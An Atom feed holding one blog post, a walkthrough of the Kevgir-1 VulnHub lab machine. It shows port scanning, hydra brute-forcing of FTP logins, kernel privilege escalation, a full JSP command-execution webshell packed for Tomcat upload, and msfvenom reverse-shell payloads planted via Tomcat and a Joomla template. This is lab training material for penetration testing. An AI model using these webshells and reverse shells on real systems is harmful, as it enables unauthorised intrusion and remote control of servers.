<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: joomla | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/joomla/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-06-27T16:31:45-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[vulhub:kevgir1]]></title>
    <link href="http://wg135.github.io/blog/2016/05/02/vulhub-kevgir1/"/>
    <updated>2016-05-02T14:42:52-05:00</updated>
    <id>http://wg135.github.io/blog/2016/05/02/vulhub-kevgir1</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/kevgir-1,137/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>hydra</li>
<li>msfvenom</li>
<li>joomscan</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.174 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.174 -p-</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Let attack ftp now.</p>

<p><code>hydra -L ~/tools/SecLists/Usernames/top_shortlist.txt -P ~/tools/SecLists/Passwords/john.txt  -u  -s 25 192.168.79.174 ftp</code></p>

<p>get the user name and password</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>try ssh using same username and password</p>

<p><code>ssh -p 1322 admin@192.168.79.174</code></p>

<p>FTP attack DONE</p>

<p>Now it is privilege escalation time</p>

<p><code>uname -a</code>, get the result:</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit 14.04</code>
<img src="/images/blog/vulhub/kevgir1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>try <code>/linux/local/37292.c</code>, copy it to /var/www/html/, use wget to download to target machine, then compile it.</p>

<p><code>gcc 37292.c -o attack -static</code>, then run <code>attack</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>failed, now try harder.</p>

<p>In the searchsploit result, there is a 39166.c. Lets try this one.</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>GET the ROOT!!</p>

<p>Now let&rsquo;s attack port 8080. Use nikto to scan it first.</p>

<p><code>nikto -h 192.168.79.174:8080</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>We got the username and password for tomcat manager &hellip; good</p>

<p>log into the manager page and now we can upload webshell&hellip;.</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>create webshell(from pentester lab, you may generate it using msfvenom)</p>

<p>```php index.jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
&lt;%@ page import=&ldquo;java.io.*&rdquo; %>
&lt;%
   String cmd = request.getParameter(&ldquo;cmd&rdquo;);
   String output = &ldquo;&rdquo;;
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+&ldquo;</br>&rdquo;; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%></p>

<pre><%=output %></pre>


<pre><code>
now pack the webshell
</code></pre>

<p>mkdir webshell
cp index.jsp webshell</p>

<p>cd webshell
jar -cvf ../webshell.war *</p>

<p>```</p>

<p>now upload the webshell.war. After uploading, visit page  <code>192.168.79.174:8080/webshell/</code>.</p>

<p>get the shell</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Lets use msfvenom to create webshell</p>

<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.79.173 LPORT=4444 -f war &gt; webshell1.war</code></p>

<p>upload webshell1.war and setup netcat listening on port 4444. After connection is setup. do <code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>get the shell</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE for Tomcat</p>

<p>Now move to port 8081</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>Its Joomla!.</p>

<p>use tool <code>joomscan</code> to scan it</p>

<p><code>joomscan -u http://192.168.79.174:8081</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>get the version of joomla!</p>

<p>Now find out the vulnerability:</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>follow the instructions of this vulnerability.</p>

<p>login as admin:</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>create php reverse shell:</p>

<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.173 LPORT=6666 -e php/base64 -f raw &gt; shell.php</code></p>

<p>In Extension ->Template Manager, edit existing template. Copy the content of the shell.php to it and don&rsquo;t forgot to add &lt;?php and ?>.</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p>set up the netcat and preview the page. get the shell</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>now lets try another php webshell</p>

<p><a href="https://github.com/wg135/webshell-1/blob/master/php/reverseshell-poc.txt">reverse shell from hacksys team</a></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/kevgir1/gameover.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
</feed>
